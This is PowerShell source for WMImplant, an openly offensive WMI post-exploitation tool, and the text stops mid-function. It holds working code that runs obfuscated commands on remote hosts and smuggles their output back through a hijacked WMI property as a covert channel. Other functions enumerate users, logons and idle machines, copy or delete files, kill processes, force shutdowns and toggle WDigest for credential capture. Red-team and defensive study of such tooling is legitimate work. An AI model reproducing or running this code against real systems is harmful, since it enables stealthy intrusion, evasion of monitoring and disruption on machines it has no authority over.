<#
    WMImplant v1.0
    License: GPLv3
    Author: @ChrisTruncer
#>

function Edit-FileWMI
{
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)]
        [string]$FileLocation,
        [Parameter(Mandatory = $False)]
        [string]$CopyLocation,
        [Parameter(Mandatory = $False)]
        [switch]$Copy,
        [Parameter(Mandatory = $False)]
        [switch]$Delete
    )

    Process
    {
        if((!$Copy) -and (!$Delete))
        {
            Throw "You need to specify if a file is going to be copied or deleted!"
        }

        if($Copy)
        {
            if(!$FileLocation)
            {
                $FileLocation = Read-Host "What is the full path to the file that you would like to copy? >"
            }

            if(!$CopyLocation)
            {
                $CopyLocation = Read-Host "What is the full path to where you would like to copy the file to? >"
            }
        }
        else
        {
            if(!$FileLocation)
            {
                $FileLocation = Read-Host "What is the full path to the file that you would like to delete? >"
            }
        }

        # Add double slashes for File to copy
        $FileLocation = $FileLocation -replace '\\', '\\'

        # Make WMI Query for file to copy
        if($Credential)
        {
            $targeted_file = Get-WMIObject -Class CIM_DataFile -Filter "Name = '$FileLocation'" -Credential $Credential -ComputerName $ComputerName
        }
        else
        {
            $targeted_file = Get-WMIObject -Class CIM_DataFile -Filter "Name = '$FileLocation'" -ComputerName $ComputerName
        }

        if($Copy)
        {
            # Copy file to copy location
            $targeted_file.Copy($CopyLocation)
        }
        else
        {
            # Delete file
            $targeted_file.Delete()
        }
    }
}

function Invoke-WMIObfuscatedPSCommand
{
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [String]$PSCommand,
        [Parameter(Mandatory = $True)]
        [String]$ComputerName,
        [Parameter(Mandatory = $False)]
        [Switch]$ObfuscateWithEnvVar
    )

    Process
    {
        # Generate randomized and obfuscated syntax for retrieving PowerShell command from an environment variable if $ObfuscateWithEnvVar flag was defined.
        if($ObfuscateWithEnvVar)
        {
            # Create random alphanumeric environment variable name.
            $VarName = -join (Get-Random -Input ((((65..90) + (97..122) | % {[char]$_})) + (0..9)) -Count 5)

            # Randomly select obfuscated syntax for invoking the contents of the randomly-named environment variable.
            # More complete obfuscation options can be imported from Invoke-Obfuscation.
            $DGGetChildItemSyntaxRandom = Get-Random -Input @('Get-C`hildItem','Child`Item','G`CI','DI`R','L`S')
            $DGGetCommandSyntaxRandom   = Get-Random -Input @('Get-C`ommand','Co`mmand','G`CM')
            $DGInvokeSyntaxRandom       = Get-Random -Input @('IE`X','Inv`oke-Ex`pression',".($DGGetCommandSyntaxRandom ('{1}e{0}'-f'x','i'))")
        
            $DGEnvVarSyntax       = @()
            $DGEnvVarSyntax      += "(" + $DGGetChildItemSyntaxRandom + " env:$VarName).Value"
            $DGEnvVarSyntax      += "`$env:$VarName"
            $DGEnvVarSyntaxRandom = (Get-Random -Input $DGEnvVarSyntax)

            $DGInvokeEnvVarSyntax       = @()
            $DGInvokeEnvVarSyntax      += $DGInvokeSyntaxRandom + ' ' + $DGEnvVarSyntaxRandom
            $DGInvokeEnvVarSyntax      += $DGEnvVarSyntaxRandom + '|' + $DGInvokeSyntaxRandom
            $DGInvokeEnvVarSyntaxRandom = (Get-Random -Input $DGInvokeEnvVarSyntax)

            $PSCommandForCommandLine = $DGInvokeEnvVarSyntaxRandom
        }
        else
        {
            $PSCommandForCommandLine = $PSCommand
        }

        # Set final PowerShell command to be executed by WMI.
        $ObfuscatedCommand = "powershell $PSCommandForCommandLine"

        # Extract username if $Credential were specified. Otherwise use current username.
        if($Credential)
        {
            $Username = $Credential.UserName
        }
        else
        {
            $Username = $env:USERNAME
        }

        # Set PowerShell command in an environment variable if $ObfuscateWithEnvVar flag was defined.
        if($ObfuscateWithEnvVar)
        {
            if($Credential)
            {
                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $ComputerName
            }
        }

        # Launch PowerShell command.
        if($Credential)
        {
            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -Credential $Credential -ComputerName $ComputerName
        }
        else
        {
            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -ComputerName $ComputerName
        }

        # Delete environment variable containing PowerShell command if $ObfuscateWithEnvVar flag was defined.
        if($ObfuscateWithEnvVar)
        {
            if($Credential)
            {
                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $ComputerName -Credential $Credential | Remove-WmiObject
            }
            else
            {
                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $ComputerName | Remove-WmiObject
            }
        }

        <#DELETE BELOW BLOCK FOR FINAL RELEASE#>
        $ShowFunFactsForPOV = $False
        if($ShowFunFactsForPOV -AND $ObfuscateWithEnvVar)
        {
            Write-Host "`n`nHere's what just happened:" -ForegroundColor White
            Write-Host "Random env var NAME :: " -NoNewLine -ForegroundColor White
            Write-Host $VarName -ForegroundColor Cyan
            Write-Host "Env var VALUE       :: " -NoNewLine -ForegroundColor White
            Write-Host $PSCommand -ForegroundColor Cyan
            Write-Host "PS cmdline launcher :: " -NoNewLine -ForegroundColor White
            Write-Host $ObfuscatedCommand -ForegroundColor Green
        }
        <#DELETE ABOVE BLOCK FOR FINAL RELEASE#>

    } # End of Process Block
    end{}
} # End of Function block

function Find-CurrentUsers
{
    <# This function list user accounts with active processes
     on the targeted system #>
    param
    (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
    )

    Process
    {

        Write-Verbose "Connecting to $ComputerName"

        $system_process_accounts = Get-WMIObject Win32_Process @PSBoundParameters | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique

        foreach($user_name in $system_process_accounts) 
        { 
            if((!($user_name -Like "*NT AUTHORITY*")) -and ($user_name -ne '\')) 
            { 
                $user_name
            }
        }
    }
}

function Find-VacantComputer
{
    # This function gathers running processes on the targeted system and tries to find
    # a screensaver or windows login process.  It also attempts to enumerate active accounts
    # on the targeted system through Win32_computersystem
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
    )

    Process
    {

        # Need to add in filtering here to stop if a "true" has been found for screensavers being active
        Write-Verbose "Connecting to $ComputerName"
        
        Write-Verbose "Checking for active screensaver or logon screen processes"

        $all_processes = Get-ProcessListingWMImplant @PSBoundParameters

        $ScreenshotActive = $all_processes | Select-String ".scr"
        $LoginPrompt = $all_processes | Select-String "LogonUI.exe"

        # If either returned true, we can assume the user is not active at their desktop
        if ($ScreenshotActive -or $LoginPrompt)
        {
            Write-Output "Screensaver or Logon screen is active on $ComputerName!"
        }
        else
        {
            Write-Output "User is at present at $ComputerName!"
        }

        try
        {
            $user = Get-WmiObject -Class win32_computersystem @PSBoundParameters -ErrorAction Stop | select -ExpandProperty username

            if($user)
            {
                Write-Output "$user has a session on $ComputerName!"
            }
        }
        catch
        { 
            $message = $_.Exception.Message
            if($message -like '*not process argument because*')
            {
                Write-Output "No users appear active on $ComputerName"
            }
            elseif($message -like '*RPC server is unavailable*')
            {
                Write-Verbose "Cannot connect to $ComputerName"
            }
        }
    }
}

function Get-ComputerDrives
{
    # This function attempts to list local and network drives attached to the
    # targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
    )

    Process
    {
        $filter = "DriveType = '4' OR DriveType = '3'"

        Get-WmiObject -class win32_logicaldisk @PSBoundParameters -Filter $filter
    }
    end{}
}

function Get-HostInfo
{
    # This function attempts to gather basic information about the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
    )

    Process
    {
        try
        {
            $sys_info = Get-WmiObject -class win32_computersystem @PSBoundParameters -ErrorAction Stop
        }
        catch
        {
            Continue
        }

        if($sys_info.Name)
        {
            $sys_info
        }
    }
    end{}
}

function Get-InstalledPrograms
{
    # This functions retrieves applications that have been installed on the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
    )

    Process
    {

        # Store data in existing WMI property, but keep original value
        $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration @PSBoundParameters).DebugFilePath

        Write-Verbose "Running remote command and writing to WMI property"
        $remote_command = '$fct = (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | format-list | out-string).Trim(); $fctenc=[Int[]][Char[]]$fct -Join '',''; $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $fctenc; $a.Put()'

        Invoke-WMIObfuscatedPSCommand @PSBoundParameters -PSCommand $remote_command -ObfuscateWithEnvVar

        # Poll remote system, and determine if the script is done
        # If not, sleep and poll again
        $quit = $false
        while($quit -eq $false)
        {
            Write-Verbose "Polling property to see if the script has completed"
            $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration @PSBoundParameters
            
            try 
            {
                if($Original_WMIProperty -match $modified_WMIObject.DebugFilePath)
                {
                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
                    Start-Sleep -s 5
                }
                else 
                {
                    Write-Verbose "Script is complete, pulling data now"
                    $quit = $true
                }
            }
            catch
            {
                Write-Verbose "Script is not done, sleeping for 5 and trying again"
                Start-Sleep -s 5
            }
        }
    
        # This is the encoding routine which encodes data in a Device Guard compliant manner
        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
        # Print to console
        $decode

        # Replacing original WMI property value from remote system
        Write-Verbose "Replacing original WMI property value from remote system"

        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
        $null = $modified_WMIObject.Put()
        
        Write-Verbose "Done!"
    }
    end{}
}

function Get-NetworkCards
{
    # This function is designed to check for actie IPs on remote Systems
    # and print any systems with multiple NICs
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $False)]
        [string]$ComputerName
    )

    Process
    {
        $adapters = Get-WmiObject -class win32_networkadapterconfiguration @PSBoundParameters

        foreach($nic in $adapters)
        {
            if($nic.IPAddress -ne $null)
            {
                $nic
            }
        }
    }
    end{}
}

function Get-ProcessListingWMImplant
{
    # This function lists all running processes on the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $False)] 
        [string]$ComputerName
    )

    Process
    {
        Write-Verbose "Connecting to $ComputerName"

        Get-WMIObject Win32_Process @PSBoundParameters | ForEach-Object { $_.ProcessName } | Sort-Object | Get-Unique
    }
}

function Get-WMIEventLogins
{
<#
.DESCRIPTION
Will get remote login details from event log on remote hosts.
This can be used to find out where people are logging in from or
to find jump boxes.

.PARAMETER ComputerName
List of targets. Will accept value from pipe.

.PARAMETER User
Username to connect to remote host

.PARAMETER Pass
Password to connect to remote host

.PARAMETER FileName
Path to save output to
#>
    
    Param
    (
        # Parameter Assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)]
        [string]$FileName
    )

    Process {

        Write-Verbose "Connecting to $ComputerName"

        if($Credential)
        {
            $results = Get-WmiObject -Credential $Credential -ComputerName $ComputerName -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
        }

        else
        {
            $results = Get-WmiObject -ComputerName $ComputerName -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
        }

        $temp2 = @()
        ForEach ($line in $results)
        {
            $importantPart = $line.Message -split "New Logon"
            $temp2 += $importantPart[1] -split '[\r\n]' | Select-String -pattern "account name:", "workstation name:", "source network address:"
        }        

        $finalResult = @(); 
        For($i=0; $i -lt $temp2.Count; $i+=4) { 
            $accountName = ([string]($temp2[$i+0])).Split(":")[1].Trim();             
            $workstationName = ([string]($temp2[$i+2])).Split(":")[1].Trim(); 
            $sourceAddress = ([string]($temp2[$i+3])).Split(":")[1].Trim(); 
                        
            if (!($accountName.EndsWith('$')) -and ($accountName -ne '-') -and ($accountName -match '^[^0-9]+$')) {           
                $keyPair = "$accountName,$workstationName,$sourceAddress";
                $finalResult += $keyPair                 
            }
        }
        Write-Output "User Account, System Connecting To, System Connecting From"
        $finalResult | Sort-Object -Unique

        if($FileName)
        {
            $results | Out-File -Encoding ASCII -FilePath $FileName
        }
    }
}

function Invoke-CommandExecution
{
    # This function allows you to run a command-line command on the targeted system and
    # receive its output
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)]
        [string]$ExecCommand
    )

    Process
    {
        if(!$ExecCommand)
        {
            $ExecCommand = Read-Host "Please provide the command you'd like to run >"
        }

        # Get original WMI Property
        if($Credential)
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential).DebugFilePath
        }
        else
        {
            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName).DebugFilePath
        }

        Write-Verbose "Building PowerShell command"

        $remote_command = '$output = '
        $remote_command += "($ExecCommand | Out-String).Trim();"
        $remote_command += ' $EncodedText = [Int[]][Char[]]$output -Join '','';'
        $remote_command += ' $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()'

        Write-Verbose "Running command on remote system..."

        if($Credential)
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
        }
        else
        {
            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
        }

        # Poll remote system, and determine if the script is done
        # If not, sleep and poll again
        $quit = $false
        while($quit -eq $false)
        {
            Write-Verbose "Polling property to see if the script has completed"
            if($Credential)
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName
            }
            
            try 
            {
                if($Original_WMIProperty -match  $modified_WMIObject.DebugFilePath)
                {
                    Write-Verbose "Script is not done, sleeping for 5 and trying again"
                    Start-Sleep -s 5
                }
                else 
                {
                    Write-Verbose "Script is complete, pulling data now"
                    $quit = $true
                }
            }
            catch
            {
                Write-Verbose "Script is not done, sleeping for 5 and trying again"
                Start-Sleep -s 5
            }
        }
    
        $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
        # Print to console
        $decode

        # Replacing WMI Property
        Write-Verbose "Replacing WMI Property"

        $modified_WMIObject.DebugFilePath = $Original_WMIProperty
        $null = $modified_WMIObject.Put()

        Write-Verbose "Done!"
    }
}

function Invoke-CommandGeneration
{
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
    )

    # This function generates the command line command users would run to invoke WMImplant
    # in a non-interactive manner
    Show-WMImplantMainMenu

    # Read in user's menu choice
    $GenSelection = Read-Host "What is the command you'd like to run? >"
    $GenSelection = $GenSelection.Trim().ToLower()

    $AnyCreds = Read-Host "Do you want to run this in the context of a different user? [yes] or [no]? >"
    $AnyCreds = $AnyCreds.Trim().ToLower()

    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
    {
        # Query user for user account and password to use
        $GenUsername = Read-Host "Please provide the domain\username to use for authentication >"
        $GenPassword = Read-Host "Please provide the password to use for authentication >"
    }

    # hashmap for command generation
    $wmimplant_commands = @{"set_default" = "`nInvoke-WMImplant -SetWMIDefault";
                            "cat" = "`nInvoke-WMImplant -Cat -RemoteFile ";
                            "copy" = "`nInvoke-WMImplant -Copy -LocalFile ";
                            "delete" = "`nInvoke-WMImplant -Delete -LocalFile ";
                            "download" = "`nInvoke-WMImplant -Download ";
                            "ls" = "`nInvoke-WMImplant -LS -RemoteDirectory ";
                            "search" = "`nInvoke-WMImplant -Search ";
                            "upload" = "`nInvoke-WMImplant -Upload -LocalFile ";
                            "command_exec" = "`nInvoke-WMImplant -CommandExec -RemoteCommand ";
                            "disable_wdigest" = "`nInvoke-WMImplant -DisableWdigest";
                            "disable_winrm" = "`nInvoke-WMImplant -DisableWinRM";
                            "enable_wdigest" = "`nInvoke-WMImplant -EnableWdigest";
                            "enable_winrm" = "`nInvoke-WMImplant -EnableWinRM";
                            "registry_mod" = "`nInvoke-WMImplant ";
                            "remote_posh" = "`nInvoke-WMImplant -RemotePosh ";
                            "service_mod" = "`nInvoke-WMImplant ";
                            "process_kill" = "`nInvoke-WMImplant -ProcessKill ";
                            "process_start" = "`nInvoke-WMImplant -ProcessStart -RemoteFile ";
                            "ps" = "`nInvoke-WMImplant -PS";
                            "active_users" = "`nInvoke-WMImplant -ActiveUsers";
                            "basic_info" = "`nInvoke-WMImplant -BasicInfo";
                            "drive_list" = "`nInvoke-WMImplant -DriveList";
                            "ifconfig" = "`nInvoke-WMImplant -IFConfig";
                            "installed_programs" = "`nInvoke-WMImplant -InstalledPrograms";
                            "logon_events" = "`nInvoke-WMImplant -LogonEvents";
                            "logoff" = "`nInvoke-WMImplant -LogOff";
                            "reboot" = "`nInvoke-WMImplant -Reboot";
                            "poweroff" = "`nInvoke-WMImplant -PowerOff";
                            "vacant_system" = "`nInvoke-WMImplant -VacantSystem"
                            }

    switch ($GenSelection)
    {
        "change_user"
        {
            Throw "This really isn't applicable unless you are using WMImplant interactively."
        }

        "exit"
        {
            Throw "This command isn't applicable unless using WMImplant interactively"
        }

        "gen_cli"
        {
            Throw "You are already generating a command!"
        }

        "set_default"
        {
            $Command = $wmimplant_commands.Get_Item("set_default")
        }

        "help"
        {
            Throw "You are already looking at the help menu!"
        }

        "cat"
        {
            $Command = $wmimplant_commands.Get_Item("cat")
            $FileRead = Read-Host "What's the full path to the file you'd like to read? >"
            $Command += $FileRead
        }

        "copy"
        {
            $Command = $wmimplant_commands.Get_Item("copy")
            $FiletoCopy = Read-Host "What's the full path to the file you'd like to copy? >"
            $CopytoLocation = Read-Host "What's the full path to where you'd like to copy the file? >"
            $Command += "$FiletoCopy -RemoteFile $CopytoLocation"
        }

        "delete"
        {
            $Command = $wmimplant_commands.Get_Item("delete")
            $FiletoDelete = Read-Host "What's the full path to the file you'd like to delete? >"
            $Command += "$FiletoDelete"
        }

        "download"
        {
            # Determine which file you want to download, and where to save it
            $GenDownload = Read-Host "What is the full path to the file you want to download? >"
            $GenSavePath = Read-Host "What is the full path to where you'd like to save the file? >"

            $Command = $wmimplant_commands.Get_Item("download")
            $Command += "-RemoteFile $GenDownload -LocalFile $GenSavePath"
        }

        "ls"
        {
            $DirLs = Read-Host "What is the full path to the directory you want to list? >"
            $Command = $wmimplant_commands.Get_Item("ls")
            $Command += "$DirLs"
        }

        "search"
        {
            $SearchBy = Read-Host "Do you want to search for a file [extension] or [name]? >"
            $SearchBy = $SearchBy.Trim().ToLower()
            $SearchDrive = Read-Host "What drive do you want to search? Ex C: >"
            $SearchDrive = $SearchDrive.Trim().ToLower()
            $Command = $wmimplant_commands.Get_Item("search")
            $Command += "-RemoteDrive $SearchDrive "

            if($SearchBy -eq "extension")
            {
                $SearchExt = Read-Host "What is the file extension you are looking for? >"
                $SearchExt = $SearchExt.Trim().ToLower()
                $Command += "-RemoteExtension $SearchExt"
            }
            else
            {
                $SearchFile = Read-Host "What is the file name you are looking for? >"
                $SearchFile = $SearchFile.Trim().ToLower()
                $Command += "-RemoteFile $SearchFile"
            }
        }

        "upload"
        {
            $FileToUpload = Read-Host "Please provide the full path to the local file you want to upload >"
            $UploadLocation = Read-Host "Please provide the full path to the location you'd like to upload the file >"
            $Command = $wmimplant_commands.Get_Item("upload")
            $Command += "$FileToUpload -RemoteFile $UploadLocation"
        }

        "command_exec"
        {
            $GenCommandExec = Read-Host "What command do you want to run on the remote system? >"
            $Command = $wmimplant_commands.Get_Item("command_exec")
            $Command += "`"$GenCommandExec`""
        }

        "disable_wdigest"
        {
            $Command = $wmimplant_commands.Get_Item("disable_wdigest")
        }

        "disable_winrm"
        {
            $Command = $wmimplant_commands.Get_Item("disable_winrm")
        }

        "enable_wdigest"
        {
            $Command = $wmimplant_commands.Get_Item("enable_wdigest")
        }

        "enable_winrm"
        {
            $Command = $wmimplant_commands.Get_Item("enable_winrm")
        }

        "registry_mod"
        {
            $GenRegMethod = Read-Host "Do you want to [create] or [delete] a string registry value? >"
            $GenRegMethod = $GenRegMethod.Trim().ToLower()
            $GenRegHive = Read-Host "What hive would you like to modify? Ex: hklm >"
            $GenRegKey = Read-Host "What's the registry key you'd like to modify? Ex: SOFTWARE\Microsoft\Windows >"
            $GenRegValue = Read-Host "What's the registry subkey you'd like to modify? Ex: WMImplantInstalled >"
            $Command = $wmimplant_commands.Get_Item("registry_mod")

            switch($GenRegMethod)
            {
                "create"
                {
                    $GenRegData = Read-Host "What's the data you'd like to modify? >"
                    $Command += "-KeyCreate -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -RegValue $GenRegData"
                }

                "delete"
                {
                    $Command += "-KeyDelete -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue"
                }
            }
        }

        "remote_posh"
        {
            $PoshLocation = Read-Host "What's the file location where the PowerShell script you want to run is located? >"
            $PoshFunction = Read-Host "What's the PowerShell Function you'd like to call? >"
            $Command = $wmimplant_commands.Get_Item("remote_posh")
            $Command += "-Location $PoshLocation -Function $PoshFunction"
        }

        "service_mod"
        {
            $GenServiceAction = Read-Host "Do you want to [start], [stop], [create], or [delete] a service? >"
            $GenServiceAction = $GenServiceAction.Trim().ToLower()
            $GenServiceName = Read-Host "What is the name of the service? >"
            $Command = $wmimplant_commands.Get_Item("service_mod")
            $Command += "-ServiceName $GenServiceName "

            switch($GenServiceAction)
            {
                "start"
                {
                    $Command += "-ServiceStart "
                }

                "stop"
                {
                    $Command += "-ServiceStop "
                }

                "delete"
                {
                    $Command += "-ServiceDelete "
                }

                "create"
                {
                    $GenServicePath = Read-Host "What's the full path to the binary that will be used by the service?"
                    $Command += "-ServiceCreate -RemoteFile $GenServicePath"
                }
            }
        }

        "process_kill"
        {
            $GenKillMethod = Read-Host "Do you want to kill a process by its [name] or [pid]? >"
            $GenKillMethod = $GenKillMethod.Trim().ToLower()
            $Command = $wmimplant_commands.Get_Item("process_kill")

            switch($GenKillMethod)
            {
                "name"
                {
                    $GenProcName = Read-Host "What's the name of the process you want to kill? >"
                    $Command += "-ProcessName $GenProcName"
                }

                "pid"
                {
                    $GenProcID = Read-Host "What's the Process ID of the process you want to kill? >"
                    $Command += "-ProcessID $GenProcID"
                }
            }
        }

        "process_start"
        {
            $GenProcPath = Read-Host "What's the path to the binary you want to run? >"
            $Command = $wmimplant_commands.Get_Item("process_start")
            $Command += "$GenProcPath"
        }

        "ps"
        {
            $Command = $wmimplant_commands.Get_Item("ps")
        }

        "active_users"
        {
            $Command = $wmimplant_commands.Get_Item("active_users")
        }

        "basic_info"
        {
            $Command = $wmimplant_commands.Get_Item("basic_info")
        }

        "drive_list"
        {
            $Command = $wmimplant_commands.Get_Item("drive_list")
        }

        "ifconfig"
        {
            $Command = $wmimplant_commands.Get_Item("ifconfig")
        }

        "installed_programs"
        {
            $Command = $wmimplant_commands.Get_Item("installed_programs")
        }

        "logon_events"
        {
            $GenSaveFile = Read-Host "Do you want to save the log output to a file? [yes/no] >"
            $GenSaveFile = $GenSaveFile.Trim().ToLower()
            $Command = $wmimplant_commands.Get_Item("logon_events")

            if($GenSaveFile -eq "yes")
            {
                $GenFileSave = Read-Host "What's the full path to where you'd like the output saved? >"
                $GenFileSave = $GenFileSave.Trim()
                $Command += " -LocalFile $GenFileSave"
            }
        }

        "logoff"
        {
            $Command = $wmimplant_commands.Get_Item("logoff")
        }

        "reboot"
        {
            $Command = $wmimplant_commands.Get_Item("reboot")
        }

        "power_off"
        {
            $Command = $wmimplant_commands.Get_Item("power_off")
        }

        "vacant_system"
        {
            $Command = $wmimplant_commands.Get_Item("vacant_system")
        }

        default
        {
            Write-Output "You did not select a valid command!  Please try again!"
        }
    } #End of switch

    if($Command -ne '')
    {
        if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
        {
            $Command += " -RemoteUser $GenUsername -RemotePass $GenPassword`n"
        }

        # See if user is reading in computers from a file
        $FileInput = Read-Host "Do you want to run a WMImplant against a list of computers from a file? [yes] or [no] >"
        $FileInput = $FileInput.Trim().ToLower()
        if(($FileInput -ceq 'y') -or ($FileInput -ceq 'yes'))
        {
            $ComputerPath = Read-Host "What is the full path to the file containing a list of computers? >"
            $Command = $Command.Trim()
            $Command = "Get-Content $ComputerPath | $Command"
        }
        else
        {
            $Command += " -ComputerName $ComputerName"
        }

        # Print command
        $Command
    }
    
} #End of Function

function Invoke-ProcessPunisher
{
    # This function kills a process on the targeted system via name or PID
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)] 
        [string]$PName,
        [Parameter(Mandatory = $False)] 
        [string]$ProcId
    )

    Process
    {
        if(!$PName -and !$ProcId)
        {
            $kill_method = Read-Host "Do you want to kill a process by [name] or [pid]? >"
            $kill_method = $kill_method.Trim().ToLower()

            if($kill_method -eq "name")
            {
                $PName = Read-Host "What is the name of the process you want to kill? >"
                $PName = $PName.Trim().ToLower()
            }
            elseif($kill_method -eq "pid")
            {
                $ProcID = Read-Host "What is the process id you want to kill? >"
                $ProcID = $ProcID.Trim().ToLower()
            }
            else
            {
                Throw "You need to kill a process by its name or PID!"
            }
        }

        if($PName)
        {
            Write-Verbose "Killing process via process name"

            if($Credential)
            {
                Get-WmiObject -Class win32_Process -Credential $Credential -Computername $ComputerName -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
            }
            else
            {
                Get-WmiObject -Class win32_Process -Computername $ComputerName -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
            }
        }

        elseif($ProcID)
        {
            Write-Verbose "Killing process via process ID"

            if($Credential)
            {
                Get-WmiObject -Class win32_Process -Credential $Credential -Computername $ComputerName -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
            }
            else
            {
                Get-WmiObject -Class win32_Process -Computername $ComputerName -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
            }
        }
    }
    end{}
}

function Invoke-PowerOptionsWMI
{
    # This function allows users to poweroff, reboot, or log users off the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False, ParameterSetName='shutdown')] 
        [switch]$Shutdown,
        [Parameter(Mandatory = $False, ParameterSetName='reboot')] 
        [switch]$Reboot,
        [Parameter(Mandatory = $False, ParameterSetName='logoff')] 
        [switch]$Logoff
    )

    Process
    {
        if(!$Shutdown -and !$Reboot -and !$Logoff)
        {
            $Action = Read-Host "Are you looking to [reboot], [shutdown], or [logoff] users on the target system? >"
            $Action = $Action.Trim().ToLower()

            switch($Action)
            {
                "reboot"
                {
                    $Reboot = $true
                }

                "shutdown"
                {
                    $Shutdown = $true
                }

                "logoff"
                {
                    $Logoff = $true
                }
            }
        }

        if($Shutdown)
        {
            $power_option = 5
        }
        elseif($Reboot)
        {
            $power_option = 6
        }
        elseif($Logoff)
        {
            $power_option = 4
        }

        Write-Verbose "Connecting to $ComputerName"

        if($Credential)
        {
            (gwmi win32_operatingsystem -Credential $Credential -ComputerName $ComputerName).Win32Shutdown($power_option)
        }
        else
        {
            (gwmi win32_operatingsystem -ComputerName $ComputerName).Win32Shutdown($power_option)
        }
    }
    end{}
}

function Invoke-ProcSpawn
{
    # This function starts a user provided process on the targeted system
    # (File/executable must already be on the system)
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)] 
        [string]$Command
    )

    Process
    {

        if(!$Command)
        {
            $Command = Read-Host "What command do you want to run? >"
            $Command = $Command.Trim()
        }

        if($Credential)
        {
            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Credential -Computername $ComputerName
        }

        else
        {
